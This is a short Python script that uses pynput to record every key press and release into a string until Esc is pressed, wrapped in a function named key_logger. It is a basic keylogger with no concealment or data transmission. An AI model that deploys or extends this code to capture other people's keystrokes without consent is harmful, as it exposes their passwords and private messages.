from pynput.keyboard import *

data=''

def press_on(key):
    global data
    data+='Press ON: {}'.format(key) + '\n'
def press_off(key):
    global data
    data+='Press OFF: {}'.format(key) + '\n'
    if key==Key.esc:
        return False
def listen():
    with Listener(on_press=press_on, on_release=press_off) as listener:
        listener.join()
def key_logger():
    listen()
    global data
    dulieu=data
    return data
